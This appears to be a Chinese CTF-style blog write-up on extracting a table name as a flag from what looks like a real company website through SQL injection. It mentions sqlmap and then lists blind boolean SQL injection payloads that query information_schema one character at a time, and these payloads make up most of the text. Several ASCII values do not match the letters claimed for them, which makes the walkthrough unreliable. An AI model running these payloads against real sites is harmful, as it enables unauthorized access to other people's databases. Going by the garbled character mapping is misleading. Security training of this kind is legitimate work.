    <content type="text"><![CDATA[WEB进阶-实战2注入链接：http://www.kabelindo.co.id 要求是表的最后一个是flag值 就是一个网站 对这个网站进行注入方法：1.SQLMAP直接跑得到flag值 2.手工注入这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。 上百度查询使用数字型注和盲注，直接转载大牛文章 盲注 id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23 发现有二十二个表 所以 需要 爆出第二十二个表 接着就按着 盲注一步一步来 （第一个字母，到最后一个字母） 12345678910111213141516171819 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),1,1))=116%23 t and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),2,1))=98%23 b and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),3,1))=110%23 n and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),4,1))=111%23 o and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),5,1))=116%23 m and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),6,1))=116%23 a and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),7,1))=116%23 x到了第八位发现为0，空格 即就是只有七位，终于报完了。。。。。类似 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),8,1))=0%23经过我的一步一步测试，终于爆出表明 为 tbnomax 最后输入 flag{tbnomax}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
